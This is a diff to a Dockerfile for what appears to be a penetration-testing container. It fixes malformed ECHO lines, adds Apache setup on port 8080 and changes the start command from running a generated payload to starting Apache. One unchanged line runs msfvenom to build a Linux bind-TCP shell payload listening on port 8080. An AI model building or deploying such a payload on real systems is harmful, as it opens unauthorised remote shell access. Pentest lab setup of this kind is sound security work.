@@ -5,36 +5,49 @@ MAINTAINER Pentester
 ENV TAR_GZ_URL=https://github.com/ptitdoc/dockersploit/archive/master.tar.gz \
     BUILD_DEPS='gcc g++ git make python bash'
 
-ECHO "HTTP Proxy: $http_proxy"
-ECHO "HTTPS Proxy: $https_proxy"
-ECHO "Pentest: $pentest"
+RUN echo "HTTP Proxy: $http_proxy"
+RUN echo "HTTPS Proxy: $https_proxy"
+RUN echo "Pentest: $pentest"
 
-ECHO "Creating directories"
+RUN echo "Creating directories"
 
 RUN mkdir -p /pentest
 RUN mkdir -p /pentest-data
 WORKDIR /pentest
 
-ECHO "Decompressing GIT"
+RUN echo "Decompressing GIT"
 
 #ADD $PKG_JSON_URL ./package.json
 ADD $TAR_GZ_URL ./master.tar.gz
 RUN set -x \
 && tar -xzvf master.tar.gz
 
-ECHO "Running MSFVENOM"
+RUN echo "Running MSFVENOM"
 RUN msfvenom --platform linux -p linux/x64/shell/bind_tcp lport=8080 -f elf -o payload
 
-ECHO "Creating user"
+RUN echo "Configuring Apache"
+RUN sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf
+
+# Manually set up the apache environment variables
+ENV APACHE_RUN_USER pentest
+ENV APACHE_RUN_GROUP pentest
+ENV APACHE_LOG_DIR /var/log/apache2
+ENV APACHE_LOCK_DIR /var/lock/apache2
+ENV APACHE_PID_FILE /var/run/apache2.pid
+
+
+RUN echo "Creating user"
 RUN groupadd -r pentest \
 && useradd -r -g pentest pentest \
 && chown pentest:pentest /pentest-data
 
-ECHO "Docker configuration"
-USER pentest 
+RUN echo "Docker configuration"
+#USER pentest 
 
 EXPOSE 8080
 
 #VOLUME ["/pentest-data"]
 
-CMD ["/pentest/payload"]
+CMD /usr/sbin/apache2ctl -D FOREGROUND
+
+#CMD ["/pentest/payload"]
